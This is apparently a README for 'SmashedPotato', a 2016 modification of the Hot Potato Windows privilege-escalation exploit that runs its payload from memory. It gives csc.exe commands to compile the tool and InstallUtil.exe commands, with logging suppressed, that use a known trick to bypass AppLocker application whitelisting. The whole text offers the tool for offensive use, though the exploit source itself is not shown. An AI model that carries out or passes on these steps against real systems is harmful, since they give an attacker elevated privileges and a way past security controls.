# SmashedPotato
By Cn33liz 2016

A modification of @breenmachine original Hot Potato Priv Esc Exploit

### Mofifications:

* Merged all .NET assemblies into a single assembly and Compressed this into a Byte[] array.
* Runs Potato assembly from Memory.
* Included the InstallUtil AppLocker Bypass method (Credits @SubTee).
* Made some Automation.

To Compile as x86 binary:

```
cd \Windows\Microsoft.NET\Framework\v4.0.30319

csc.exe  /out:"C:\Utils\SmashedPotatoX86.exe" /platform:x86 "C:\Utils\SmashedPotato.cs"
```

To Compile as x64 binary:

```
cd \Windows\Microsoft.NET\Framework64\v4.0.30319

csc.exe  /out:"C:\Utils\SmashedPotatoX64.exe" /platform:x64 "C:\Utils\SmashedPotato.cs"
```

To run as x86 binary and bypass Applocker (Credits for this great bypass go to Casey Smith aka subTee):

```
cd \Windows\Microsoft.NET\Framework\v4.0.30319

InstallUtil.exe /logfile= /LogToConsole=false /U C:\Utils\SmashedPotatoX86.exe
```

To run as x64 binary and bypass Applocker:

```
cd \Windows\Microsoft.NET\Framework64\v4.0.30319

InstallUtil.exe /logfile= /LogToConsole=false /U C:\Utils\SmashedPotatoX64.exe
```

### Shout-outs:

Go out to @breenmachine/@foxglovesec for their magnificent Potato code and @SubTee for his App Whitelisting techniques. 
